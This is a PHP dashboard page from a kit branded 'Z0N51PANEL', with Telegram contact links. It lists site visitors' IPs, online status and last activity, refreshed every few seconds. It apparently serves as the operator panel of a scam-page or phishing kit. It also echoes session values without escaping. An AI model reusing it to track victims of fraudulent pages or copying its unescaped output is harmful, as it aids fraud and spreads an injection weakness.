<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    include_once 'inc/app.php';
    if( !is_logged() ) {
        header("location: index.php");
        exit();
    }
?>

<!DOCTYPE html>
<html style="display: flex; flex-direction: column; height: 100%;">
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.2.0/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css">

    <link rel="stylesheet" href="assets/css/helpers.css">
    <link rel="stylesheet" href="assets/css/style.css">

    <title>Data</title>
</head>
<body style="display: flex; flex-direction: column; height: 100%;">

    <header>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
            <div class="container-fluid">
                <a class="navbar-brand" href="#">Z0N51PANEL</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav me-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="index.php">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="visitors.php">Visitors</a>
                        </li>
                        <?php if( is_superadmin() ) : ?>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                            Users
                            </a>
                            <ul class="dropdown-menu">
                                <li><a class="dropdown-item" href="users.php">List</a></li>
                                <li><a class="dropdown-item" href="createuser.php">Create</a></li>
                            </ul>
                        </li>
                        <?php endif; ?>
                    </ul>
                    <ul class="navbar-nav">
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">Weclome <?php echo $_SESSION['name']; ?></a>
                            <ul class="dropdown-menu">
                                <li><a class="dropdown-item" href="profile.php?id=<?php echo $_SESSION['id']; ?>">Profile</a></li>
                                <li><a class="dropdown-item" href="logout.php">Logout</a></li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
    </header>

    <main id="main" class="pt50 pb50">
        <div class="container">
            <div class="table-responsive"></div>
                <table id="table" class="table table-hover">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th></th>
                            <th>IP</th>
                            <th>Last activity</th>
                        </tr>
                    </thead>
                    
                    <tfoot>
                        <tr>
                            <th>#</th>
                            <th></th>
                            <th>IP</th>
                            <th>Last activity</th>
                        </tr>
                    </tfoot>
                </table>
            </div>
            
        </div>
    </main>

    <footer id="footer">
        <div class="container" style="max-width: 700px;">
            <h3 class="mb-4">Z0N51PANEL <i style="color: red;" class="fa-solid fa-heart"></i></h3>
            <div class="row">
                <div class="col-md-6 mb-lg-0 mb-md-3 mb-sm-3 mb-3">
                    <h4>Channels</h4>
                    <ul>
                        <li><a target="_blank" href="https://t.me/z0n51pages">@z0n51pages</a></li>
                    </ul>
                </div>
                <div class="col-md-6">
                    <h4>Contacts</h4>
                    <ul>
                        <li><a target="_blank" href="https://t.me/z0n51official">@z0n51official</a></li>
                        <li><a target="_blank" href="https://t.me/elz0n51">@elz0n51</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </footer>
    
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.4/js/dataTables.bootstrap5.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/moment.min.js"></script>
    <script src="assets/js/main.js"></script>

    <script>
        var table = $('#table').DataTable( {
            responsive: true,
            ajax: "getvisitors.php",
            order: [[0, 'desc']],
            "columns": [
                {data:"id"},
                {data:"",
                    render : function(data, type, row) {
                        if( row.online == "online" ) {
                            return '<span class="badge text-bg-success">Online</span>';
                        } else {
                            return '<span class="badge text-bg-danger">Offline</span>';
                        }
                    }
                },
                {data:"ip"},
                {data:"last_activity",
                    render : function(data, type, row) {
                        var dd = row.last_activity;
                        return moment.unix(dd).fromNow();
                    }
                },
            ],
        } );
        setInterval( function () {
            table.ajax.reload(function(){
                
            });
        }, 4000 );
    </script>

</body>
</html>